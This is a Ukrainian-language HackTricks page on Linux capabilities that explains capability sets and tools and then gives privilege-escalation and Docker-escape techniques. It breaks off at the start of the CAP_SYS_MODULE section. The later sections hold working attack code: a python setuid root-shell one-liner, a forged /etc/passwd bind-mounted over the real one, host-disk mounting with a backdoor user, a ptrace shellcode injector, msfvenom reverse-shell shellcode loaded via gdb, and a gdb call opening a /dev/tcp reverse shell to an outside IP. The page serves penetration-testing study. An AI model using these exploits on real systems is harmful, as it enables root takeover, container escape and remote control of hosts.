# Linux Capabilities

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) є найбільш важливою подією з кібербезпеки в **Іспанії** та однією з найважливіших в **Європі**. З **місією просування технічних знань** цей конгрес є кипучою точкою зустрічі для професіоналів технологій та кібербезпеки у будь-якій галузі.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities розбивають **привілеї root на менші, відокремлені одиниці**, що дозволяє процесам мати підмножину привілеїв. Це мінімізує ризики, не надаючи повних привілеїв root непотрібно.

### Проблема:
- Звичайні користувачі мають обмежені дозволи, що впливає на завдання, такі як відкриття мережевого сокета, яке вимагає доступу root.

### Набори привілеїв:

1. **Успадковані (CapInh)**:
- **Мета**: Визначає привілеї, успадковані від батьківського процесу.
- **Функціональність**: Коли створюється новий процес, він успадковує привілеї від свого батька в цьому наборі. Корисно для збереження певних привілеїв під час створення процесів.
- **Обмеження**: Процес не може отримати привілеї, які не мав його батьківський процес.

2. **Ефективні (CapEff)**:
- **Мета**: Представляє фактичні привілеї, якими процес користується у будь-який момент.
- **Функціональність**: Це набір привілеїв, які перевіряються ядром для надання дозволу на різні операції. Для файлів цей набір може бути прапорцем, що вказує, чи слід вважати дійсними привілеї, дозволені для файлу.
- **Значення**: Ефективний набір є важливим для миттєвих перевірок привілеїв, діючи як активний набір привілеїв, якими може користуватися процес.

3. **Дозволені (CapPrm)**:
- **Мета**: Визначає максимальний набір привілеїв, якими може користуватися процес.
- **Функціональність**: Процес може підвищити привілегію з дозволеного набору до ефективного, надаючи можливість використовувати цю привілегію. Він також може скинути привілеї зі свого дозволеного набору.
- **Межа**: Він діє як верхній ліміт для привілеїв, якими може користуватися процес, забезпечуючи, що процес не перевищує своєї заздалегідь визначеної області привілеїв.

4. **Обмеження (CapBnd)**:
- **Мета**: Встановлює максимальні привілеї, які процес може отримати протягом свого життєвого циклу.
- **Функціональність**: Навіть якщо у процесу є певна привілегія в його успадкованому або дозволеному наборі, він не може отримати цю привілегію, якщо вона також не є в обмежувальному наборі.
- **Сценарій використання**: Цей набір особливо корисний для обмеження потенціалу підвищення привілеїв процесу, додаючи додатковий рівень безпеки.

5. **Амбієнтні (CapAmb)**:
- **Мета**: Дозволяє певним привілегіям зберігатися під час системного виклику `execve`, який зазвичай призводить до повного скидання привілеїв процесу.
- **Функціональність**: Забезпечує, що програми, які не є SUID і не мають пов'язаних файлових привілеїв, можуть зберігати певні привілеї.
- **Обмеження**: Привілегії в цьому наборі підлягають обмеженням успадкованих та дозволених наборів, забезпечуючи, що вони не перевищують дозволених привілеїв процесу.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Для отримання додаткової інформації перевірте:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Процеси та можливості виконуваних файлів

### Можливості процесів

Щоб переглянути можливості для певного процесу, скористайтеся файлом **status** у каталозі /proc. Оскільки він надає більше деталей, давайте обмежимо його лише інформацією, що стосується можливостей Linux.\
Зверніть увагу, що для всіх запущених процесів інформація про можливості зберігається на кожен потік, для виконуваних файлів у файловій системі вона зберігається у розширених атрибутах.

Можливості, визначені в /usr/include/linux/capability.h, можна знайти тут.

Можливості поточного процесу можна знайти за допомогою `cat /proc/self/status` або використовуючи `capsh --print`, а можливості інших користувачів - у `/proc/<pid>/status`.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ця команда повинна повернути 5 рядків на більшості систем.

* CapInh = Успадковані можливості
* CapPrm = Дозволені можливості
* CapEff = Ефективні можливості
* CapBnd = Обмежувальний набір
* CapAmb = Набір амбієнтних можливостей
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ці шістнадцяткові числа не мають сенсу. Використовуючи утиліту capsh, ми можемо розкодувати їх у назву можливостей.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Перевіримо зараз **можливості**, які використовує `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Хоча це працює, існує ще один і простіший спосіб. Щоб переглянути можливості запущеного процесу, просто скористайтеся інструментом **getpcaps**, за яким слідує ідентифікатор процесу (PID). Ви також можете надати список ідентифікаторів процесів.
```bash
getpcaps 1234
```
Перевіримо тут можливості `tcpdump` після надання достатньо можливостей виконуваному файлу (cap_net_admin та cap_net_raw) для перехоплення мережі (tcpdump працює у процесі 9562):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Як ви можете побачити, надані можливості відповідають результатам 2 способів отримання можливостей бінарного файлу. 
Інструмент _getpcaps_ використовує системний виклик **capget()** для запиту доступних можливостей для певного потоку. Цей системний виклик потрібно лише надати PID, щоб отримати більше інформації.

### Можливості бінарних файлів

Бінарні файли можуть мати можливості, які можна використовувати під час виконання. Наприклад, дуже поширеною є можливість `cap_net_raw` у бінарного файлу `ping`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Ви можете **шукати бінарні файли з можливостями** за допомогою:
```bash
getcap -r / 2>/dev/null
```
### Зниження можливостей за допомогою capsh

Якщо ми знищимо можливості CAP\_NET\_RAW для _ping_, то утиліта ping більше не повинна працювати.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Крім виводу _capsh_ самого себе, команда _tcpdump_ також повинна викликати помилку.

> /bin/bash: /usr/sbin/tcpdump: Операція не дозволена

Помилка чітко показує, що команді ping не дозволено відкривати сокет ICMP. Тепер ми впевнені, що це працює як очікувалося.

### Видалення можливостей

Ви можете видалити можливості бінарного файлу за допомогою
```bash
setcap -r </path/to/binary>
```
## Права користувача

Здається, **можливо також призначати можливості користувачам**. Це, ймовірно, означає, що кожен процес, запущений користувачем, зможе використовувати можливості користувача.\
Основано на [цьому](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [цьому](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) та [цьому](https://stackoverflow.com/questions/1956732-is-it-possible-to-configure-linux-capabilities-per-user) кілька файлів потрібно налаштувати, щоб надати користувачеві певні можливості, але той, хто призначає можливості кожному користувачеві, буде `/etc/security/capability.conf`.\
Приклад файлу:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Середовищні можливості

Компілюючи наступну програму, можна **створити оболонку bash всередині середовища, яке надає можливості**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
У **bash, виконаному компільованим амбієнтним бінарним файлом**, можна спостерігати **нові можливості** (звичайний користувач не матиме жодних можливостей у розділі "поточний").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Ви можете **додавати лише можливості, які присутні** як у наборі дозволених, так і у спадковому наборі.
{% endhint %}

### Бінарні файли, що розуміють можливості / бінарні файли, що не розуміють можливості

**Бінарні файли, що розуміють можливості не використовуватимуть нові можливості**, надані середовищем, однак **бінарні файли, що не розуміють можливості, використовуватимуть** їх, оскільки вони не відхилять їх. Це робить бінарні файли, що не розуміють можливості, вразливими всередині спеціального середовища, яке надає можливості для бінарних файлів.

## Можливості служби

За замовчуванням **служба, яка працює в якості root, матиме призначені всі можливості**, і у деяких випадках це може бути небезпечно.\
Отже, файл **конфігурації служби** дозволяє **вказати** **можливості**, які ви хочете, щоб вони мали, **і** **користувача**, який повинен виконувати службу, щоб уникнути запуску служби з непотрібними привілеями:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Можливості в контейнерах Docker

За замовчуванням Docker надає деякі можливості контейнерам. Дуже легко перевірити, які саме можливості надані, виконавши:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) - це найбільш важлива подія з кібербезпеки в **Іспанії** та одна з найважливіших в **Європі**. З **місією просування технічних знань**, цей конгрес є важливою точкою зустрічі для професіоналів технологій та кібербезпеки у будь-якій галузі.

{% embed url="https://www.rootedcon.com/" %}

## Підвищення привілеїв/Втеча з контейнера

Можливості корисні, коли ви **хочете обмежити власні процеси після виконання привілейованих операцій** (наприклад, після налаштування chroot та прив'язки до сокету). Однак їх можна використовувати для виконання зловмисних команд або аргументів, які потім виконуються в якості root.

Ви можете накладати можливості на програми за допомогою `setcap` та запитувати їх за допомогою `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` означає, що ви додаєте можливість ("-" видалить її) як Ефективну та Дозволену.

Щоб ідентифікувати програми в системі або папці з можливостями:
```bash
getcap -r / 2>/dev/null
```
### Приклад експлуатації

У наступному прикладі виявлено, що бінарний файл `/usr/bin/python2.6` має вразливість для підвищення привілеїв:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Можливості**, необхідні для `tcpdump`, щоб **дозволити будь-якому користувачеві перехоплювати пакети**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Спеціальний випадок "порожніх" можливостей

[З документації](https://man7.org/linux/man-pages/man7/capabilities.7.html): Зверніть увагу, що можна призначити порожні набори можливостей для файлу програми, тому можна створити програму з встановленим бітами встановлення ідентифікатора користувача власника на root, яка змінює ефективний та збережений ідентифікатор користувача власника процесу, який виконує програму на 0, але не надає жодних можливостей цьому процесу. Іншими словами, якщо у вас є бінарний файл, який:

1. не належить користувачеві root
2. не має встановлених бітів `SUID`/`SGID`
3. має порожній набір можливостей (наприклад: `getcap myelf` повертає `myelf =ep`)

тоді **цей бінарний файл буде запущено як root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** є дуже потужною можливістю Linux, часто рівною до рівня root через її обширні **адміністративні привілеї**, такі як монтування пристроїв або маніпулювання функціями ядра. Хоча незамінна для контейнерів, що імітують цілі системи, **`CAP_SYS_ADMIN` створює значні виклики з точки зору безпеки**, особливо в контейнеризованих середовищах, через його потенціал для підвищення привілеїв та компрометації системи. Тому його використання вимагає строгих оцінок безпеки та обережного управління, з великим перевагою для скидання цієї можливості в контейнерах, специфічних для додатків, для дотримання **принципу мінімальних привілеїв** та мінімізації поверхні атаки.

**Приклад з бінарним файлом**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
За допомогою Python ви можете змінити _passwd_ файл і підмонтувати його поверх справжнього _passwd_ файлу:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
І, нарешті, **підмонтувати** змінений файл `passwd` на `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
І ви зможете **`su` як root** за допомогою пароля "password".

**Приклад з середовищем (вибірка з Docker)**

Ви можете перевірити увімкнені можливості всередині контейнера Docker за допомогою:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі ви можете побачити, що можливість SYS\_ADMIN увімкнена.

* **Mount**

Це дозволяє контейнеру Docker **монтувати диск хоста та вільно отримувати до нього доступ**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Повний доступ**

У попередньому методі нам вдалося отримати доступ до диска хоста Docker.\
У випадку, якщо ви виявите, що хост працює з сервером **ssh**, ви можете **створити користувача всередині диска хоста Docker** та отримати до нього доступ через SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Це означає, що ви можете вийти з контейнера, впровадивши шелл-код всередині деякого процесу, що працює всередині хоста.** Для доступу до процесів, що працюють всередині хоста, контейнер повинен бути запущений принаймні з параметром **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** надає можливість використовувати функціональність налагодження та відстеження системних викликів, надану `ptrace(2)` та викликами прикріплення пам'яті, такими як `process_vm_readv(2)` та `process_vm_writev(2)`. Хоча це потужно для діагностики та моніторингу, якщо `CAP_SYS_PTRACE` увімкнено без обмежувальних заходів, таких як фільтр seccomp на `ptrace(2)`, це може значно підірвати безпеку системи. Зокрема, його можна використовувати для обхідних дій щодо інших обмежень безпеки, зокрема тих, які накладаються seccomp, як показано у [доказах концепції (PoC) таких як цей](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Приклад з бінарним файлом (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Приклад з бінарним файлом (gdb)**

`gdb` з можливістю `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Створіть shellcode за допомогою msfvenom для впровадження в пам'ять через gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Налагодити процес root за допомогою gdb та скопіювати раніше згенеровані рядки gdb:
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Приклад з середовищем (втеча з Docker) - Ще одне зловживання gdb**

Якщо **GDB** встановлено (або ви можете встановити його за допомогою `apk add gdb` або `apt install gdb`, наприклад), ви можете **налагоджувати процес з хоста** та змусити його викликати функцію `system`. (Ця техніка також потребує можливості `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Ви не зможете побачити вивід виконаної команди, але вона буде виконана цим процесом (так отримайте обернене з'єднання).

{% hint style="warning" %}
Якщо ви отримуєте помилку "No symbol "system" in current context.", перевірте попередній приклад завантаження шелл-коду в програму через gdb.
{% endhint %}

**Приклад з оточенням (втеча з Docker) - Впровадження шелл-коду**

Ви можете перевірити увімкнені можливості всередині контейнера Docker за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Перелік **процесів**, що працюють на **хості** `ps -eaf`

1. Отримати **архітектуру** `uname -m`
2. Знайти **shellcode** для архітектури ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Знайти **програму** для **ін'єкції** **shellcode** в пам'ять процесу ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Змінити** **shellcode** всередині програми та **скомпілювати** її `gcc inject.c -o inject`
5. **Ін'єкція** та отримання вашого **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** дозволяє процесу **завантажувати та видаляти модулі ядра (системні виклики `init_module(2)`, `finit_module(2)` та `delete_module(2)`)**, надаючи прямий доступ до основних операцій ядра. Ця можливість представляє критичні ризики безпеки, оскільки вона дозволяє підвищення привілеїв та повне компрометування системи, дозволяючи внесення змін до ядра, тим самим обхід усіх механізмів безпеки Linux, включаючи модулі безпеки Linux та ізоляцію контейнерів.
**Це означає, що ви можете** **вставляти/видаляти модулі ядра в/з ядра хост-машини.**

**Приклад з бінарним файлом**

